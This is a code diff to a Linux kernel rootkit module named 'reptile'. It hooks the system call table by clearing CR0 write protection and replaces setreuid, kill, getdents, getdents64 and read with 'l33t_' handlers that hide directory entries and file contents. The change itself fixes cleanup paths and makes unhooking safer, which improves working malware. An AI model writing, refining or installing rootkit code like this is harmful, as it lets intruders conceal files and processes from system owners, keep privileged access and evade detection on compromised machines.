@@ -43,7 +43,7 @@
 int hidden = 0, knockon = 0, hide_file_content = 1;
 static struct list_head *mod_list;
 static unsigned long *sct;
-atomic_t read_a;
+atomic_t read_on;
 
 asmlinkage int (*o_setreuid)(uid_t ruid, uid_t euid);
 asmlinkage int (*o_kill)(pid_t pid, int sig);
@@ -243,10 +243,7 @@ asmlinkage int l33t_getdents64(unsigned int fd, struct linux_dirent64 __user *di
 	kdir = kzalloc(ret, GFP_KERNEL);
 	if (kdir == NULL) return ret;
 
-	if(copy_from_user(kdir, dirent, ret)){
-		kfree(kdir);
-		return ret;
-	}
+	if(copy_from_user(kdir, dirent, ret)) goto end;
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
 	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
@@ -270,8 +267,9 @@ asmlinkage int l33t_getdents64(unsigned int fd, struct linux_dirent64 __user *di
 		}
 		off += dir->d_reclen;
 	}
-	if(copy_to_user(dirent, kdir, ret))
+	if(copy_to_user(dirent, kdir, ret)) goto end;
 
+end:
 	kfree(kdir);
 	return ret;
 }
@@ -288,10 +286,7 @@ asmlinkage int l33t_getdents(unsigned int fd, struct linux_dirent __user *dirent
 	kdir = kzalloc(ret, GFP_KERNEL);
 	if(kdir == NULL) return ret;
 
-	if(copy_from_user(kdir, dirent, ret)){
-		kfree(kdir);
-		return ret;
-	}
+	if(copy_from_user(kdir, dirent, ret)) goto end;
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
 	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
@@ -315,8 +310,9 @@ asmlinkage int l33t_getdents(unsigned int fd, struct linux_dirent __user *dirent
 		}
 		off += dir->d_reclen;
 	}
-	if(copy_to_user(dirent, kdir, ret))
-	
+	if(copy_to_user(dirent, kdir, ret)) goto end;
+
+end:	
 	kfree(kdir);
 	return ret;
 }
@@ -329,7 +325,7 @@ asmlinkage ssize_t l33t_read(int fd, void *buf, size_t nbytes) {
 	if(hide_file_content) {
 		ret = -EBADF;
 
-		atomic_set(&read_a, 1);
+		atomic_set(&read_on, 1);
 		f = e_fget_light(fd, &fput_needed);
 
 		if (f) {
@@ -339,7 +335,7 @@ asmlinkage ssize_t l33t_read(int fd, void *buf, size_t nbytes) {
 	    	
 			fput_light(f, fput_needed);
 		}
-		atomic_set(&read_a, 0);
+		atomic_set(&read_on, 0);
 	} else {
 		ret = o_read(fd, buf, nbytes);
 	}
@@ -348,7 +344,7 @@ asmlinkage ssize_t l33t_read(int fd, void *buf, size_t nbytes) {
 }
 
 static int __init reptile_init(void) { 
-
+	atomic_set(&read_on, 0);
 	sct = (unsigned long *)find_sys_call_table();
 	
 	if(sct) {
@@ -375,12 +371,33 @@ static int __init reptile_init(void) {
 } 
 
 static void __exit reptile_exit(void) { 
-	if(o_setreuid && o_kill && o_getdents64 && o_getdents && o_read) {
+	if(o_setreuid){
 		write_cr0(read_cr0() & (~0x10000));
 		sct[__NR_setreuid] = (unsigned long)o_setreuid;
+		write_cr0(read_cr0() | 0x10000);
+	}
+
+	if(o_kill){
+		write_cr0(read_cr0() & (~0x10000));
 		sct[__NR_kill] = (unsigned long)o_kill;
+		write_cr0(read_cr0() | 0x10000);
+	}
+
+	if(o_getdents64){
+		write_cr0(read_cr0() & (~0x10000));
 		sct[__NR_getdents64] = (unsigned long)o_getdents64;
+		write_cr0(read_cr0() | 0x10000);
+	}
+
+	if(o_getdents){
+		write_cr0(read_cr0() & (~0x10000));
 		sct[__NR_getdents] = (unsigned long)o_getdents;
+		write_cr0(read_cr0() | 0x10000);
+	}
+
+	if(o_read) {
+		while(atomic_read(&read_on) != 0) schedule();
+		write_cr0(read_cr0() & (~0x10000));
 		sct[__NR_read] = (unsigned long)o_read;
 		write_cr0(read_cr0() | 0x10000);
 	}
